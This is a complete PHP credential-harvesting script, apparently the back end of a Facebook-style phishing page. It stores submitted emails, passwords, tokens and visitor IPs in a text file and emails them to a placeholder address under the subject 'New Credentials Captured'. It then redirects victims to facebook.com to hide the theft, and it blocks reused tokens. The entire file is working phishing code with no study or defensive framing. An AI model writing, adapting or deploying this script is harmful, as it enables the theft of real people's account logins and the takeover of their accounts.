<?php
$email = $_POST['email'] ?? '';
$password = $_POST['pass'] ?? '';
$token = $_POST['token'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

$to_email = 'your_email@gmail.com';
$subject = 'New Credentials Captured';

$token_file = 'used_tokens.txt';
if (file_exists($token_file)) {
    $used = file($token_file, FILE_IGNORE_NEW_LINES);
    if (in_array($token, $used)) {
        header('Location: https://www.facebook.com');
        exit;
    }
}

file_put_contents($token_file, $token . PHP_EOL, FILE_APPEND);

$log = "[$timestamp] IP: $ip | Email: $email | Password: $password | Token: $token" . PHP_EOL;
file_put_contents('credentials.txt', $log, FILE_APPEND);

$message = "Time: $timestamp\nIP: $ip\nEmail: $email\nPassword: $password\nToken: $token";
$headers = "From: noreply@localhost.com\r\n";
mail($to_email, $subject, $message, $headers);

header('Location: https://www.facebook.com');
exit;
?>
